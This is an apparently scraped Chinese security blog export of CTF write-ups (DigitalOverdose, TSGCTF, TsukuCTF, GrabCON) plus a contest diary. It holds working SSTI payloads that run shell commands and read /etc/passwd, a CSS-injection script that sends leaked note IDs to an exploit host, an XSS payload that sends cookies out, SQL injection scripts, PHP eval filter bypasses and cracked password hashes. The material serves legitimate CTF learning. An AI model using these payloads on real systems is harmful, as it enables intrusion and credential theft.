QlVIQ3tyM3F1MXIzXzFzX3MwbTN0aDFuZ185MDkxMDI5MTMwKCk4MTEyOTM4MTIxfQ==\nBUHC{r3qu1r3_1s_s0m3th1ng_9091029130()8112938121}\nWeb/madlib  I just created the first draft of my first flask project, a madlib generator that fills the given words into a madlib template!\nTry it out and let me know what you think! The character length limit should make this app pretty secure.\n 一个flask的webapp\n先看下源码\nfrom flask import Flask, render_template_string, request, send_from_directory app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def index(): return send_from_directory(\u0026#39;html\u0026#39;, \u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/madlib\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def madlib(): if len(request.json) == 5: verb = request.json.get(\u0026#39;verb\u0026#39;) noun = request.json.get(\u0026#39;noun\u0026#39;) adjective = request.json.get(\u0026#39;adjective\u0026#39;) person = request.json.get(\u0026#39;person\u0026#39;) place = request.json.get(\u0026#39;place\u0026#39;) params = [verb, noun, adjective, person, place] if any(len(i) \u0026gt; 21 for i in params): return \u0026#39;your words must not be longer than 21 characters!\u0026#39;, 403 madlib = f\u0026#39;To find out what this is you must {verb}the internet then get to the {noun}system through the visual MAC hard drive and program the open-source but overriding the bus won\\\u0026#39;t do anything so you need to parse the online SSD transmitter, then index the neural DHCP card {adjective}.{person}taught me this trick when we met in {place}allowing you to download the knowledge of what this is directly to your brain.\u0026#39; return render_template_string(madlib) return \u0026#39;This madlib only takes five words\u0026#39;, 403 @app.route(\u0026#39;/source\u0026#39;) def show_source(): return send_from_directory(\u0026#39;/app/\u0026#39;, \u0026#39;app.py\u0026#39;) app.run(\u0026#39;0.0.0.0\u0026#39;, port=1337) 看到了熟悉的模板渲染（语段来自于u/masterhacker_bot），只会渲染特定的位置，而且有个特殊的{adjective}.{person}\n存在5个可以ssti的地方，但是限制每一个框字符数必须在21个之内；其中还有两个非常特殊的{adjective}.{person}连了起来，我们可以用这个.点号连接我们payload的长度\n这样相当于有4个可以构造的地方，前两个用来将长长的payload用短的变量及逆行替换，第三个是payload本体，第三和第四个位置均是回显位；首先通过config.update方法不断地向后取值来拿到可以用的函数并将其存储在config.a中，之后调用它来rce\n{%set x=config%} {%set y=x.update%} {{y(a=x __class__.__init__)}} {{config.a}} 回显\u0026lt;function Config.__init__ at 0x7fd75dae31e0\u0026gt;，现在我们设法调用函数来执行命令\n{{y(a=x.a __globals__['os'])}} 回显\u0026lt;module 'os' from '/usr/local/lib/python3.6/os.py'\u0026gt;\n{{y(a=x.a popen)}} 回显\u0026lt;function popen at 0x7fd75ed5a730\u0026gt;，此时我们的config.a就是os.popen()，现在来调用它来执行命令\n{%set x=config%} {%set y=x.a%} {{y('uname -a') read()}} {{config.a}} 回显Linux madlib-digitaloverdose:madlib-46bf3bc4 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 GNU/Linux，成功执行了命令，接下来就很简单了，读一波flag\n{{y('cat flag.txt') read()}} DO{an0th3r_ssti_ch4ll3nge_l0l593deff6}\n————很幸运的是最后我们的payload正好小于21个字符，显然我们被长度限制了发挥，但是这里还有别的trick\nJinja不仅支持模板内部的变量赋值还支持~进行字符串的连接，再利用上config.command甚至能读出/etc/passwd\n{%set x=config%} {%set y=x.update%} {%set p='cat /etc'%} {%set q=p~'/passw'%} {{y(b=q~'d')}} {%set x=config%} {%set y=x.a%} {%set z=config.b%} {{z}} {{y(z).read()}} 参考：Digital Overdose 2021 Autumn CTF Writeup — madlib (web)\nLog Analysis/Part1 - Ingress  Our website was hacked recently and the attackers completely ransomwared our server!\nWe\u0026rsquo;ve recovered it now, but we don\u0026rsquo;t want it to happen again.\nHere are the logs from before the attack, can you find out what happened?\n 给出了访问日志，有庞大的数据，n行~~，但是不太会看~~\n在37557行出现了访问/ywesusnz cmd%3Dcd+..，往后还有一些ywesusnz开头的，37629行出现了/ywesusnz cmd%3Dcat+RE97YmV0dGVyX3JlbW92ZV90aGF0X2JhY2tkb29yfQ==，b64解密\nDO{better_remove_that_backdoor}\nLog Analysis/Part 2 - Investigation  Thanks for finding the RFI vulnerability in our FAQ. We have fixed it now, but we don\u0026rsquo;t understand how the attacker found it so quickly.\nWe suspect it might be an inside job, but maybe they got the source another way. Here are the logs for the month prior to the attack, can you see anything suspicious?\nPlease submit the attackers IP as the flag as follow, DO{x.x.x.x}\n 仍然是给出了很多行的日志\n发现了可疑的内容DO{45.85.1.176} 但是提交flag错误\n（然后发现是很傻逼的把200.13.84.124当作flag交了……\nLog Analysis/Part 3 - Backup Policy  So it looks like the attacker scanned our site for old backups right? Did he get one?\n 接着找，发现了/backup.zip的请求是200ok\n但是交flag的时候不知道交啥，看了wp才发现藏在了UA头里\nMozilla/5.0+(Windows+NT+5.1;+RE97czNjcjN0X19fYWdlbnR9;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/60.0.3112.90+Safari/537.36 将中间那一串b64解密后得到\nDO{s3cr3t___agent}\nSource Analysis/A1 - C-nanigans  Find the flag parts in the source code, assemble the flag, submit the flag.\n(This code may not compile, and it is useless to attempt to do so)\n 提示我们关注源码而不是编译\n444f7b 733075526333 5f406e616c79333173 7d hex解密后得到DO{s0uRc3_@naly31s}\nHash Cracking/Hash 1 54a09c22fc0d1af44865e411ff6e8d50 phantomlover\nHash Cracking/Hash 2 52ed4b109a2662fdf15edfd95632667869fc5802 fishchips\nHash Cracking/Hash 3 550b57fc03f0a800fab603cb8eb4e29fbd5c76655d7ab995b1fe9c6ddf963a3d2627ebd79e067022f792bb2490a260c051aecbc4a7aedb3ec5dbf9439cd66f81 mommadobbins\nHash Cracking/Hash 4 451716a045ca5ec7f25e191ab5244c61aaeeb008c4753a2065e276f1baba4723 Hash Identifier\nhashcat -m 6900 ghost\nhappyfamily\nHash Cracking/Hash 5 $2a$10$QlR/ZlXgQPWfx9JmRffMZutcL3o3w6JAiRbfvGda4u09lrfOvgcH6 hashcat -m 3200 bcrypt\ncowabunga\nHash Cracking/Hash 6 $1$veryrand$QetWu27IoJ2FFSG30xKAQ. Hash Analyzer\nhashcat -m 500 MD5-Crypt\nscottiebanks\nHash Cracking/Hash 7 $6$veryrandomsalt$t8EIWEiDpWYzeC1c44q7f6ZENOuO2wagnrJBPs4d/PptWxAxlnH7qRcf0xnKagaOEHBN9dGBV5Y1syJSB3s6H1 hashcat -m 1800 sha512crypt $6$\nigetmoney\n 很水的wp，或者说是复现，没有什么参考价值；挺有意思的题，学到了ssti的新trick；Source Analysis的剩下两个题全是web+reverse/crypto/pwn（指路wp: Boris | I think this could be C4），谢谢，完全看不懂，已经跪了\nweb狗死路一条死路一条死路一条死路一条死路一条\n😅\n","date":"2021-10-22T11:54:15+08:00","permalink":"https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/","section":"posts","tags":["wp"],"title":"DigitalOverdoseCTF2021 Wp"},{"categories":[],"contents":"比赛前一天/15号 下午2点50的飞机，结果临出学校前发现身份证丢了，贼尴尬，找了两圈没找到就直接去机场了，用临时身份证明上了飞机之后收到电话说身份证被捡到了orz 这么低级的错误下次绝不会有了TAT\n到郑州之后打滴滴结果司机电话打不通，又正好下雨，跟队友一起上了个打表飞快的小黑车，到地铁站门口就148块钱，还好最后只给了100，但是也太他妈的坑了\n之后挤人贼多的地铁，先去酒店附近的派出所开了个证明，然后到酒店住下，饭还行，是1层自助餐，我跟另一个小姐姐住一个房间\n比赛第一天/16号 早上起来之后跟同队的两个师傅去科技馆签到，领衣服和参赛证（那边的志愿者是郑州中学的小姐姐们，颜值超高\n然后彩排了一下选手发言，回去吃中饭（默默吐槽一下某几位师傅去参观科技馆没带我玩这件事了！！！记仇 = =。\n3点半开幕式，我默默做了个选手代表发言（表情管理大失败 所有照片都拍得贼丑）\n4点开赛，真不愧是跑男模式，把我一整年的运动量都给跑完了，成功克服了不敢坐手扶电梯的恐惧症，科技馆4层上下来回跑\n最开始给的题是要在科技馆中找到5张图片上的地方并且拍照，这是最耗体力的，跑着跑着就迷路了（后来想的话，这个环节又不给分，一开始就莽有点草率，可以直接做别的题）\n然后后面的题分散在1234层，有的题是只能做一次但是不限时，有的是限时又只能一次，根据解出的程度给卡片，把上面的成语作为flag交到平台上\n说说几个印象深刻的题吧，火焰熊熊，红色革命阅读理解题，给几张纸阅读展板上的内容然后答题，不太好找，拿了1600分，10分钟不太够用，有几个是蒙上去的\n阿尼玛格斯，刚开始我过去之后一看题目描述，好家伙，拟态，还是只能做一次，我就先走了，后面再过来做的时候发现这他妈也是个阅读理解题，草，还是本童话书，全程罚抄写\n阿拉霍洞开，匪夷所思的题，以为是打开存包柜，没想到就是戳开左下角的开始，然后点开文件夹\n还有个题是找摄像头，忘了叫啥名字了，说是有180个摄像头，前5分钟肉眼看，后5分钟能拿红外线的扫描枪，反正是尽可能往多了圈（x\n驱逐麻瓜是两个题，一个是密码，不会解，php的放到最后没时间看\n很无语的是一些项目因为场地限制还需要排队，我们排到阿拉霍洞开这个题的时候离结束就剩10分钟了，还好解的比较快\n中间我们队最高到第2名，最后截止的时候是第10，8000分，刚好挂到大屏幕上\n比完之后好多队都换了头像和签名，于是我们换了这个\n吃完饭就8点了，回去准备第二天的break\u0026amp;fix\n比赛第二天/17号 早上7点半就开始比，6点半起床，困得一批又没胃口，吃了俩蛋糕拿了个酸奶就去会场了\n匆忙连上网线，看了比赛手册，awdp模式，放了4道题，两个pwn两个web\n首先感谢一下pwn👴旺旺师傅 两个题全出了 十分nb\nweb方面，一个是php反序列化（怎么老是你） 全场0解（用到了原生类的一个特性 可以参考这个题[NepCTF 2021]梦里花来牡丹亭），一个是flask的ssti注入，一开始也是0解，但是不断的放hint都没人get到他的意思，直到最后把payload都给放出来了才开始有解，可能是想的签到难度，但是大家没签上😅\n（payload是{{lipsum['__globals__']['__builtins__']['eval']('__import__(\u0026quot;os\u0026quot;).popen(\u0026quot;ls /\u0026quot;).read()')}} ）\n然后是fix阶段，我修了php，另一位师傅修了flask，pwn👴修了一道pwn（另一个没有过check\n防御阶段的分加的特别快，修了两个题直接就干到第一了\n（忽略时间 这是晚上回来之后截的图\n应该有很多队不会用docker的相关操作吃亏了，第一轮fix只有很少的队过了check，到第二轮fix的时候还给了docker复制文件的命令\n这一场和昨天的那场综合下来我们是8623分，第二名，拿一等奖~芜湖\n第一名是北大的一个大佬，solo全场，ttttttql\n小结 被队里两个师傅带着第一次打线下，感觉还是挺棒的 ，免费吃住 爽的一批，感觉线下有一群人打ctf是个挺赛博朋克的事情哈哈哈哈哈哈哈哈哈\n打之前其实慌的一批，毕竟自己web比较菜，害怕拉跨，害怕给大家拖后腿，不过还好最后一切顺利，拿到了一等，之前从不敢设想的\n酸菜棒棒鱼yyds!!!!!!!!\n从开始学ctf，学安全方面的知识到现在也不过半年多一点，学的还是相当粗糙的，见到的师傅们都学的时间比我长，水平都比我高很多很多\n未来的路还很长，不管怎么样，我都会坚持走下去的。\n","date":"2021-10-18T20:38:54+08:00","permalink":"https://amiaaaz.github.io/2021/10/18/2021-qwbqss-a-short-diary/","section":"posts","tags":[],"title":"2021强网杯青少赛线下赛参赛记录"},{"categories":["CTF"],"contents":"https://score.ctf.tsg.ne.jp/challenges | https://ctftime.org/event/1431/tasks/\nWeb/Welcome to TSG CTF!  We want to welcome you, seriously.\n 抓包后发现我们输入的值是post的json中的key部分而不是value，很奇怪\n给了源码，看下app.js\n11行有个比较，要通过它，可以把body置空访问（用burp的话要改一下Content-Type，默认的application/json是不能置空的），typeof null === 'object'\n$ curl \u0026#34;http://34.84.69.72:34705/\u0026#34; -X POST {\u0026#34;statusCode\u0026#34;:500,\u0026#34;error\u0026#34;:\u0026#34;Internal Server Error\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Cannot read property \u0026#39;TSGCTF{M4king_We6_ch4l1en9e_i5_1ik3_playing_Jenga}\u0026#39; of null\u0026#34;} flag会在报错中出现！\nTSGCTF{M4king_We6_ch4l1en9e_i5_1ik3_playing_Jenga}\nWeb/Udon  Ta-dah! Here comes udon!\n Udon Note，一眼xss之类的\n我们发出去的note中的尖括号会被转义为实体字符，Reset会清空cookie，连带着消失之前发布过的Note\n有Tell Admin About This Udon Note的选项\n————没什么想法 以下是平淡的复现过程\n看源码，main.go\n我们需要找到那个特殊的notes_id\n接着往下看\nhttp的相应头可以泄露一些信息，这里是入手点\n仅在Firefox中有一个Link请求头，几乎等同于HTML中的\u0026lt;link\u0026gt;标签\nLink: \u0026lt;/foo.css\u0026gt;; rel=\u0026quot;stylesheet\u0026quot;; type=\u0026quot;text/css\u0026quot; \u0026lt;link rel=\u0026quot;stylesheet\u0026quot; href=\u0026quot;/foo.css\u0026quot;\u0026gt; 我们可以向app中的任意一页注入任意的css\n同时也有需要Bypass的地方，比如这里的CSP策略style-src 'self'\n我们可以先创建一个带有恶意css的note，再将这个note的链接放入Link请求头中\nhttp://ip:port/?k=Link\u0026amp;v=%3C%2F(\u0026lt;URL of a note with styles to inject\u0026gt;)%3E%3B%20rel%3D%22stylesheet%22%3B%20type%3D%22text%2Fcss%22 # exp.py from flask import Flask, request import requests import urllib.parse import string TARGET_BASE = \u0026#34;http://localhost:8080\u0026#34; LEAK_LENGTH = 10 CHAR_CANDIDATES = string.ascii_letters + string.digits EXPLOIT_BASE_ADDR = \u0026#34;http://host.docker.internal:1337\u0026#34; app = Flask(__name__) s = requests.Session() def build_payload(prefix: str, candidates: \u0026#34;List[str]\u0026#34;): global EXPLOIT_BASE_ADDR assert EXPLOIT_BASE_ADDR != \u0026#34;\u0026#34;, \u0026#34;EXPLOIT_BASE_ADDR is not set\u0026#34; payload = \u0026#34;{}\u0026#34; for candidate in candidates: id_prefix_to_try = prefix + candidate matcher = \u0026#39;\u0026#39;.join(map(lambda x: \u0026#39;\\\\\u0026#39; + hex(ord(x)) [2:], \u0026#39;/notes/\u0026#39; + id_prefix_to_try)) payload += \u0026#34;a[href^=\u0026#34; + matcher + \\ \u0026#34;] { background-image: url(\u0026#34; + EXPLOIT_BASE_ADDR + \\ \u0026#34;/leak?q=\u0026#34; + urllib.parse.quote(id_prefix_to_try) + \u0026#34;); }\u0026#34; return payload def post_note(title: str, description: str) -\u0026gt; str: r = s.post(TARGET_BASE + \u0026#34;/notes\u0026#34;, data={ \u0026#34;title\u0026#34;: title, \u0026#34;description\u0026#34;: description, }, headers={ \u0026#34;content-type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34; }, allow_redirects=False) assert r.status_code == 302, \u0026#34;invalid status code: {}\u0026#34;.format( r.status_code) return r.headers[\u0026#39;Location\u0026#39;].split(\u0026#39;/notes/\u0026#39;)[-1] def report_note_as_stylesheet(id: str) -\u0026gt; None: header_value = \u0026#39;\u0026lt;/notes/{}\u0026gt;; rel=\u0026#34;stylesheet\u0026#34;; type=\u0026#34;text/css\u0026#34;\u0026#39;.format(id) r = s.post(TARGET_BASE + \u0026#34;/tell\u0026#34;, data={ \u0026#34;path\u0026#34;: \u0026#34;/?k=Link\u0026amp;v={}\u0026#34;.format(urllib.parse.quote(header_value)), }, allow_redirects=False) assert r.status_code == 302, \u0026#34;invalid status code: {}\u0026#34;.format( r.status_code) return None @app.route(\u0026#34;/start\u0026#34;) def start(): p = build_payload(\u0026#34;\u0026#34;, CHAR_CANDIDATES) exploit_id = post_note(\u0026#34;exploit\u0026#34;, p) report_note_as_stylesheet(exploit_id) print(\u0026#34;[info]: started exploit with a new note: {}/notes/{}\u0026#34;.format(TARGET_BASE, exploit_id)) return \u0026#34;\u0026#34; @app.route(\u0026#34;/leak\u0026#34;) def leak(): leaked_id = request.args.get(\u0026#39;q\u0026#39;) if len(leaked_id) == LEAK_LENGTH: print(\u0026#34;[+] leaked (full ID): {}\u0026#34;.format(leaked_id)) r = s.get(TARGET_BASE + \u0026#34;/notes/\u0026#34; + leaked_id) print(r.text) else: print(\u0026#34;[info] leaked: {}{}\u0026#34;.format( leaked_id, \u0026#34;*\u0026#34; * (LEAK_LENGTH - len(leaked_id)))) p = build_payload(leaked_id, CHAR_CANDIDATES) exploit_id = post_note(\u0026#34;exploit\u0026#34;, p) report_note_as_stylesheet(exploit_id) print(\u0026#34;[info]: invoked crawler with a new note: \u0026#34; + exploit_id) return \u0026#34;\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: print(\u0026#34;[info] running app ...\u0026#34;) app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=1337) 详细内容参见-\u0026gt;wp\nWeb/Beginner\u0026rsquo;s Web 2021  Made drunk, so solved drunk.\n 给了源码，看下index.js，emmmmmm，创建了session.routes\n但是flag并不会在最后渲染的route中出现\n所以我们想利用GetSalt处的session.salt='flag'来转到flag的路由上来获得flag\n但是[salt]会导致重写flag，所以我们想要的session是这样的状态\nsession = { routes: { flag: ..., index: ..., ... [salt]: ..., // salt is anything different from \u0026#39;flag\u0026#39;  }, salt: \u0026#39;flag\u0026#39;, } 首先用GET /?action=SetSalt\u0026amp;data=flag来让salt='flag'，session会变成这样\nsession = { route: { flag: ...,\t// this route is overwritten and not accessible \tindex: ..., ... flag: ...,\t// here is salt \t}, salt: \u0026#39;flag\u0026#39;, } 我们想回复到route只有一个flag并且可达的状态，但是又不想删除掉salt: 'flag'\n关键之处在于set_salt，它想完成的任务是一起更新routes和salt的值\nset_salt: async (salt) =\u0026gt; { session.routes = await setRoutes(session, salt); session.salt = salt; return \u0026#39;ok\u0026#39;; } 第二行中，我们要await setRoutes，相当于\nset_salt: (salt) =\u0026gt; { return setRoutes(session, salt).then((result) =\u0026gt; { session.routes = result; session.salt = salt; return \u0026#39;ok\u0026#39;; }); } 这里会要到一个setRoutes的返回值result\nconst setRoutes = async (session, salt) =\u0026gt; { const index = await fs.readFile(\u0026#39;index.html\u0026#39;); session.routes = { // redacted \t[salt]: () =\u0026gt; salt, }; return session.routes; }; 很没必要的操作，又一遍setRoutes，纯属脱裤子放屁\n当我们设置salt = 'then'时，情况就不一样了\n{ //redacted \tthen: () =\u0026gt; salt, } 这个特殊的then关键字一出来，就很特殊，解释器会试图把它认作是await中要调用的then的部分，但是并没有await需要它这个then执行的result来作为返回值，就卡死在这里了，这个salt无处可去\nSo，GET /?action=SetSalt\u0026amp;data=then之后session将是这样的\nsession = { routes: { flag: ..., index: ..., ... then: ..., }, salt: \u0026#39;flag\u0026#39;, } 只要GET /?action=GetSalt即可，因为\nreturn session.routes[route](data);\t// route = session.salt here (just flag) 具体操作一张动图就能说清楚\n最后，这个**的东西学名叫Thenable Object，谢谢你，javascript😅\n参考：wp\nWeb/Giita  Gibson Les Paul Standard.\nSteal Cookie.\n 😭😭😭又是cookie\n看源码，app.js\n11行的正则匹配了空格、字母、数字、下划线，但是多余了一个.\n会把theme放进去进行一个过滤\n然后拼接到stylesheet link中，就再没有什么过滤了\n我们可以注入到href这里，比如\n\u0026lt;!-- theme=x%20onerror%3Dalert --\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=x onerror=alert\u0026gt; 要完整的注入js代码，我们需要cheat DOMPurify\nDOMPurify会先检测对象在不在DOMPurify.isSupported的范围内\n所以呢，我们把它给关咯\ndelete document.implementation.__proto__.createHTMLDocument 最后的Payload，U+00A0(NBSP)不在html的空白符中，但是在Javascript的空白符中\naxios({ method: \u0026#39;post\u0026#39;, url: `http://${host}:${port}/`, headers: { \u0026#39;content-type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, }, data: qs.encode({ theme: \u0026#39;x onerror=delete\\xA0document.implemenation__proto__.createHTMLDocument\u0026#39;, title: \u0026#39;x\u0026#39;, body: `\u0026lt;img src=\u0026#34;x\u0026#34; onerror=\u0026#34;location.href\u0026#34;=\u0026#39;${url}?\u0026#39; + document.cookie\u0026gt;`, }), }); 完整参见-\u0026gt;wp\n 就是菜 不会做 勉强看看wp 还不一定看得懂\n铁废物了😅\n","date":"2021-10-04T16:44:41+08:00","permalink":"https://amiaaaz.github.io/2021/10/04/tsgctf2021-wp/","section":"posts","tags":["wp"],"title":"TSGCTF2021 Wp"},{"categories":["CTF"],"contents":"这两天又开始有点摆烂的迹象，于是把周末的ctf看看wp，水一水，复现一下\n另外这个ctf最痛苦的地方在于是英日夹杂，我开始懂歪果仁做中文比赛页面的时候有多痛苦了\nWeb/logonly 给出的是一个有214155行的日志文件，只有第214154行返回200ok\n显然是进行了一个字典攻击，在第214154次尝试时撞对了，我们下载一份kali里的rockyou.txt中看一下214154是个啥（有提示用到kali进行攻击）\nTsukuCTF{qwertyuiop[]\\\\}\nWeb/digits 一个fastapi站，但是要求不是很高的样子\n加号放到url中相当于半角空格\nTsukuCTF{you_are_lucky_Tsukushi}\nWeb/login 登录框，万能密码admin'or 1#\nTsukuCTF{You_4r3_SUP3R_H4CKER}\n一般这种简单的登录都是万能密码，但是也得多试一试，加个注释符啊 分号什么的\nWeb/login2 说是代码重构过了\n再用上面的万能密码登入会显示这个站的所有账号\n说明还是有sqli，尝试一下联合注入admin'or 1 union select null,null#，跟上面是一样的回显，说明有两列，然后是愉快的注入（每一次的回显在页面的末尾，注意这个是最初要找到并确认的）\nadmin'or 1 union select table_name,null from information_schema.columns# admin'or 1 union select column_name,null from information_schema.columns where table_name='super_secret_table'# admin'or 1 union select secret,null from super_secret_table# TsukuCTF{50_muCh_GR3AT_Hacker_!ND3ED}\nWeb/login3 依然是存在sqli，用上面的两个payload都能回显正常，但是没有明确的信息，应该是需要盲注了\nimport requests def _execAnyQuery_core(query, pos, mid): url = \u0026#34;\u0026#34; params = { \u0026#34;name\u0026#34;: \u0026#34;\u0026#39;or ascii(substring(({0}),{1},1))\u0026gt;={2};#\u0026#34;.format(query, pos, mid), \u0026#34;password\u0026#34;: \u0026#34;a\u0026#34; } page = requests.post(url, data = params) return \u0026#34;ようこそ\u0026#34; in page.text def _execAnyQuery(query, pos): low = 0 high = 256 while high - low \u0026gt; 1: mid = (high + low) // 2 if _execAnyQuery(query, pos, mid): low = mid else: high = mid return low def execAnyQuery(query): i = 1 while True: char = int(_execAnyQuery(query, i)) if char == 0: return print(chr(char), end=\u0026#34;\u0026#34;) i += 1 execAnyQuery(\u0026#34;select version()\u0026#34;) for i in range(100): execAnyQuery(\u0026#34;select distinct table_name from information_schema.columnns limit 1 offset {0}\u0026#34;.format(i)) print() for i in range(10): execAnyQuery(\u0026#34;select distinct column_name from information_shcema.columns where table_name=\u0026#39;urtla_secret_tsukushi\u0026#39;limit 1 offset {0}\u0026#34;.format(i)) print() for i in range(33): execAnyQuery(\u0026#34;select secret from urtla_secret_tsukushi_limit 1 offset {0}\u0026#34;.format(i)) 这是官方wp里的二分法脚本，把简单的事拆成了3个函数，倒是也好，可复用性max\nTsukuCTF{U_Are_Geni0us_T$UKUSH1}\nWeb/Journey 抓包看，有很多307重定向，还以为是跟之前那个一样要跑一下一千多次的重定向，但是这个重定向是有限度的，最后的位置是/problems/journey/goal，回显405错误\n看wp，学到了\ncurl -H \u0026#39;Referer: https://tsukuctf.sechack365.com/problems/journey/railway/1\u0026#39; -X CONNECT https://tsukuctf.sechack365.com/problems/journey/goal 利用的是http请求中的connect方法，相关内容可参见-\u0026gt;CONNECT(MDN) | HTTP之connect method\nWeb/gyOTAKU 满足17行要求的话会通过chromium browser来返回一个截图\n我们构造一个如下的html页面\n\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt; 返回500错误，再试一下\n\u0026lt;script\u0026gt;location.href=\u0026quot;/etc/passwd\u0026quot;\u0026lt;/script\u0026gt; 成功返回\n用一下我们的老朋友/root/.bash_history\n\u0026lt;script\u0026gt;location.href=\u0026quot;/root/.bash_history\u0026quot;\u0026lt;/script\u0026gt; 可以读一下flag了\n\u0026lt;script\u0026gt;location.href=\u0026quot;/root/flagc464f9eba1.txt\u0026quot;\u0026lt;/script\u0026gt; TsukuCTF{Tsukushi_to_Sugina_no_chigai_ga_wakaran}\n 水一篇wp，水水更健康\n","date":"2021-09-13T19:15:21+08:00","permalink":"https://amiaaaz.github.io/2021/09/13/tsuku2021-wp/","section":"posts","tags":["wp"],"title":"TsukuCTF2021 Wp"},{"categories":["CTF"],"contents":"Web/E4sy Pe4sy  Hack admin user!\nAuthor: r3curs1v3_pr0xy\n 万能密码 username=admin\u0026amp;password=%27%3D%27\nGrabCON{E4sy_pe4sy_SQL_1nj3ct10n}\nWeb/Door Lock  The door is open to all! See who is behind the admin door??\nAuthor: r3curs1v3_pr0xy\n 和上面那个一样的前端页面，但是很显然万能密码失效，随便登入一个号，有水平越权\n用burp跑一下\nGrabCON{E4sy_1D0R_}\nWeb/Null Food Factory  Prove your hacking skill to get admin panel.\nAuthor: r3curs1v3_pr0xy\n 还是一模一样的前端，目标还是以admin登入\n用到的是Null byte injection，先以admin%00为用户名注册\n然后用Admin的名字登入GrabCON{Null_byt3s_1s_L0v3}\nWeb/Basic Calc  Ever used calc based on php?\nAuthor: karma\n \u0026lt;?php if (isset($_POST[\u0026#34;eq\u0026#34;])){ $eq = $_POST[\u0026#34;eq\u0026#34;]; if(preg_match(\u0026#34;/[A-Za-z`]+/\u0026#34;,$eq)){ die(\u0026#34;BAD.\u0026#34;); } echo \u0026#34;Result: \u0026#34;; eval(\u0026#34;echo \u0026#34; . $eq . \u0026#34; ;\u0026#34;); }else{ echo highlight_file(\u0026#39;index.php\u0026#39;,true); } ?\u0026gt;现在看到php的题感觉那是相当的亲切了……\n虽然是直接有了eval，但是这个正则过滤的有点狠，字母全被ban掉 就只能用xor或八进制的方式来把字母搞出来\n八进制版本：\n\u0026quot;\\163\\171\\163\\164\\145\\155\u0026quot;(\u0026quot;\\154\\163\u0026quot;) // \u0026quot;system\u0026quot;(\u0026quot;ls\u0026quot;) \u0026quot;\\163\\171\\163\\164\\145\\155\u0026quot;(\u0026quot;\\143\\141\\164\\40\\57\\146\\154\\141\\147\\147\\147\\147\\56\\164\\170\\164\u0026quot;) // \u0026quot;system(\u0026quot;cat /flagggg.txt\u0026quot;)\u0026quot; xor\nOuput: (\u0026quot;system\u0026quot;)(\u0026quot;cat /flagggg.txt\u0026quot;) = (('3'^'@').('9'^'@').('3'^'@').('4'^'@').('8'^']').('2'^'_'))(('8'^'[').('!'^'@').('4'^'@').('^'^'~').'/'.('8'^'^').('1'^']').('!'^'@').('8'^'_').('8'^'_').('8'^'_').('8'^'_').'.'.('4'^'@').('8'^'@').('4'^'@')) GrabCON{b4by_php_f0r_y0u}\n参考： https://mystiz.hk/posts/2021-08-10-uiuctf-phpfuck/ | https://ctf.0xff.re/2021/uiuctf_2021/phpfuck | https://github.com/vichhika/CTF-Writeup/blob/main/GrabCON%20CTF%202021/Web/Basic%20Calc/README.md | https://discord.com/channels/740598439796015204/884036729902866463/884147222982324264\nOSINT/ProtonDate  Can you find the date, when was this email created?\nsc4ry_gh0st@protonmail[dot]com\nGrabCON{dd_mm_yyyy}\nAuthor: CETACEAN\n 说实话 是纯猜的\nGrabCON{03_09_2021}\n但是看了wp之后发现这确实有正规的做法，一个开源工具叫ProtOSINT，所使用的api如下\nhttps://api.protonmail.ch/pks/lookup?op=index\u0026amp;search=sc4ry_gh0st@protonmail.com 拿到时间戳1630658267，即Fri 3 September 2021 08:37:47 UTC\nOSINT/Victim 1  We got to know our victims is hiding somewhere. We got access to live CCTV camera of that place. Can you find zip code of that location?\nLive Camera\nGrabCON{zipcode}\nAuthor: CETACEAN\n 给了一个摄像头的地址，用IP geolocation lookup查一下地点\n画面右上有个在动的缆车\nzipcode: 39031\nGrabCON{39031}\nOSINT/Website  My friend is having a website named, \u0026ldquo;Great Animals Here\u0026rdquo;. He have leaked the flag on his website. Can you find the flag?\nHint: He used free website builder tool to create his site. greatanimalshere\nAuthor: CETACEAN\n https://greatanimalshere.weebly.com/\nOSINT/The Tour(1)  w0nd3r50uL! I know her but she did something horrible! She recently switched to some free and open-source software for running self-hosted social networking services. Check out her profile and find the last location she visited when she felt hungry?\nAuthor : rey\n 空的，试一下wayback machine\nhttps://web.archive.org/web/20210904191920/https://www.reddit.com/user/w0nd3r50uL/ 也是空的，用sherlock查一下\n后面的内容可以详见wp了，很少做OSINT，但是感觉好有意思，就是找的好麻烦，脑洞好大，不容易啊\nOSINT/The Tour(2)  Can you find the flight number and the flight operator of the last flight that took her to the final destination? E.g. GrabCON{AF226_Air_France}\nAuthor : rey\n wp-\u0026gt;https://kashmir54.github.io/ctfs/GrabCON/#the-tour2\nMisc/Welcome  GrabCON{welcome_to_grabcon_2021}\n GrabCON{welcome_to_grabcon_2021}\nMisc/Discord  Join our discord server!\n 憨批机器人，我没搞明白这个是怎么玩的\ntmd 试了好久 结果竟然在#role\nGrabCON{s@n1ty_fl4g_1s_here}\nfxxxk\nMisc/YouTube  Find us on YouTube.\n GrabCON{th3_qu1ck_br0wn_f0x_jumps_0v3r_th3_lazy_d0g}\nMisc/Find me  Checkout author\u0026rsquo;s social media.\nAuthor: Offen5ive\n GrabCON{n0_fl4g_h3r3}\nCrypto/Warm-up  Mukesh used to drink and then smoke 5 times a day. He is now suffering form cancer his drink was 64 rupees and 32 rupees cigarette that costs to cheap for him. And he has this much of cancer now.\nAuthor: Offen5ive\n 